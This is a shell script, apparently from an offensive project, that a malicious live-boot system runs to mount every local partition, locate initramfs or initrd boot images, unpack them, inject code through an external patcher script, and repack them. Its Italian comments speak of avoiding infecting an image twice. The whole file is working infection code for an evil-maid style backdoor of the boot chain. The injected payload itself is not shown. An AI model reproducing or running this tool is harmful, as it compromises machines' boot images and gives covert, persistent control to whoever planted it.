#!/bin/sh
<<Comment
Search and Inject

Script used to looking for initramfs to infect, in every valid partition.
It should be use in the scam-live. While live is starting, this script run
in background mounting each partition which may contain an initramfs archive.
When a valid one is found, it will be decompressed, patched and compressed again.
Comment
################################################### Global Variables ###########
MOUNTPOINT=/mnt/partition
TMP_UNCPIO=/tmp/uncpio
BACKUP_DIR=/backup
TMPDIR=/tmp
CPIO_ARGS_EXTRACT="-im -D ${TMP_UNCPIO}"
CPIO_ARGS_COMPRESS="-H newc -o"
COMPRESS_TYPE="cat"
################################################################################

########################################################## Functions ###########

#############################################################################
##############################FIXME FIXME FIXME##############################
# problemi riscontrati:
# Se lancio la prima volta lo script mi fà il backup dell'initramfs pulito
# se lo lancio una seconda volta mi sovrascrive il backup con uno già sporco
# From future: Ho aggiunto -n come opzione di cp per evitare la sovrascrittura
#
# controllare se il file è già infettato, ad esempio con injectHead e bottom
# in caso positivo non riaggiungere il codice!
#############################################################################
readhex() { # Read bytes out of a file, checking that they are valid hex digits
  	dd < "$1" bs=1 skip="$2" count="$3" 2> /dev/null | \
  		LANG=C grep -E "^[0-9A-Fa-f]{$3}\$"
}

checkzero() { # Check for a zero byte in a file
  	dd < "$1" bs=1 skip="$2" count=1 2> /dev/null | \
  		LANG=C grep -q -z '^$'
}

checkArchivie() {
    archive="$1"
    if zcat -t "${archive}" >/dev/null 2>&1 ; then
      COMPRESS_TYPE="zcat"
    #  COMPRIMO_CON="gzip -1"
    elif xzcat -t "${archive}" >/dev/null 2>&1 ; then
      COMPRESS_TYPE="xzcat"
    elif bzip2 -t "${archive}" >/dev/null 2>&1 ; then
      COMPRESS_TYPE="bzip2 -c -d"
    elif lzop -t "${archive}" >/dev/null 2>&1 ; then
      COMPRESS_TYPE="lzop -c -d"
    else
      COMPRESS_TYPE="cat"
    fi
}

cpioExtract() {
    initrd="$1"
    # There may be a prepended uncompressed archive.  cpio
    # won't tell us the true size of this so we have to
    # parse the headers and padding ourselves.  This is
    # very roughly based on linux/lib/earlycpio.c
    offset=0
    while true; do
      if checkzero "$initrd" $offset; then
        offset=$((offset + 4))
        continue
      fi
      magic="$(readhex "$initrd" $offset 6)" || break
      test $magic = 070701 || test $magic = 070702 || break
      namesize=0x$(readhex "$initrd" $((offset + 94)) 8)
      filesize=0x$(readhex "$initrd" $((offset + 54)) 8)
      offset=$(((offset + 110)))
      offset=$(((offset + $namesize + 3) & ~3))
      offset=$(((offset + $filesize + 3) & ~3))
    done

    if [ $offset -ne 0 ]; then
      # Extract uncompressed archive
      cpio ${CPIO_ARGS_EXTRACT} 2> /dev/null < "$initrd"

      # Extract main archive
      subarchive="${TMPDIR}/initrd_main"
      touch ${subarchive}
      dd < "$initrd" bs="$offset" skip=1 2> /dev/null > $subarchive
      checkArchivie $subarchive
      $COMPRESS_TYPE $subarchive | cpio ${CPIO_ARGS_EXTRACT} 2> /dev/null
      rm -f $subarchive
    else
      $COMPRESS_TYPE $initr | cpio ${CPIO_ARGS_EXTRACT} 2> /dev/null
    fi
}

backupInitramfs() {
    mkdir -p ${BACKUP_DIR}/$i
    cp -Lpn $initr ${BACKUP_DIR}/$i 2>/dev/null
    # salvarsi in un file di log il path del cpio salvato
    if [ $? -eq 0 ]
    then
      echo "[+] Create backup in ${BACKUP_DIR}/$i"
    else
      echo "[!] DO NOT create backup in ${BACKUP_DIR}/$i"
    fi
}

patching () {
    /usr/bin/env python3 patcher.py -c arch.yaml ${TMP_UNCPIO} | sed -e 's/^/  /'
}

cookingEggs() { # For initramfs - cpio archive with entire file system
    echo "[+]n Patching "$initr;
    cpioExtract $initr
    patching
    PWD_SAVE=${PWD}
    cd ${TMP_UNCPIO}
    ### FIXME: ricomprimere con lo stesso algoritmo con cui era stato trovato
    find . | cpio -H newc -o 2> /dev/null | gzip -1 > $initr # re-build initramfs
    cd ${PWD_SAVE}
    rm -r ${TMP_UNCPIO}/*
    echo "[+] Patched succesfully"
}

cookingEggsLegacy() { # For initrd - ext2 formatted file where the entire file system resides
    echo "[+]o Patching "$initr;
    gunzip -c $initr > /mnt/initrd.img
    mount -o loop /mnt/initrd.img ${TMP_UNCPIO}
    patching
    umount -d ${TMP_UNCPIO}
    gzip -1 -c initrd.img > $initr
    echo "[+] Patched succesfully"
}

search() {
  # controllo su dimensione e non su nome file FIXME: da decidere in base alle statistiche
    some_initrs=$(find -O2 ${MOUNTPOINT} -iname "*initr*" -size +5M -type f 2>/dev/null); #could take a while
    for initr in $some_initrs; do
      checkArchivie $initr
      is_initr=$(${COMPRESS_TYPE} $initr 2>/dev/null | file -);
      if [[ $is_initr == *"cpio"*"SVR4"*"CRC"* ]]; then
        backupInitramfs | sed -e 's/^/  /'
        cookingEggs | sed -e 's/^/  /'
      elif [[ $is_initr == *"ext2 filesystem data"* ]]; then
        backupInitramfs | sed -e 's/^/  /'
        cookingEggsLegacy | sed -e 's/^/  /'
      fi;
    done
}

############################################################### Main ###########
mkdir -p ${MOUNTPOINT}
mkdir -p ${TMP_UNCPIO}
mkdir -p ${BACKUP_DIR}

ALL_UUID=$(blkid -s UUID -s TYPE | grep -iv swap | grep -iv ntfs | grep -iv lvm \
      | grep -iv crypto | grep -iv udf | grep -iv $(lsblk -o MOUNTPOINT,UUID \
      | grep -e "^\/[ ].*" | awk '{print $2}') | awk {'print $2'} | cut -c7- | sed -e 's/"$//')

for i in ${ALL_UUID[@]}; do
  echo "[+] Mounting "$i;
  mount -o noatime /dev/disk/by-uuid/$i ${MOUNTPOINT}
  if [ $? -eq 0 ]
  then
  search
    echo "[+] Unmounting "$i;
    umount ${MOUNTPOINT}
    if [ $? -ne 0 ]
    then
      echo "[!] Error "$?" while unmonting";
    fi
  else
    echo "[!] Error "$?" while mounting";
  fi
  # delete backup directory of this partition in case there wasn't files injected
  if [ -z "$(ls -A ${BACKUP_DIR}/$i)" ]; then
     rm -fr ${BACKUP_DIR}/$i
     if [ $? -eq 0 ]
     then
       echo "[+] Delete empty backup folder"
     else
       echo "[!] DO NOT delete empty backup folder"
     fi
  fi
done

#################just for sure######
umount -f ${TMP_UNCPIO} &>/dev/null
umount -df ${TMP_UNCPIO} &>/dev/null
####################################
rm -r ${MOUNTPOINT}
rm -r ${TMP_UNCPIO}

unset MOUNTPOINT
unset TMP_UNCPIO
unset BACKUP_DIR
unset TMPDIR
unset CPIO_ARGS_EXTRACT
unset CPIO_ARGS_COMPRESS
unset COMPRESS_TYPE
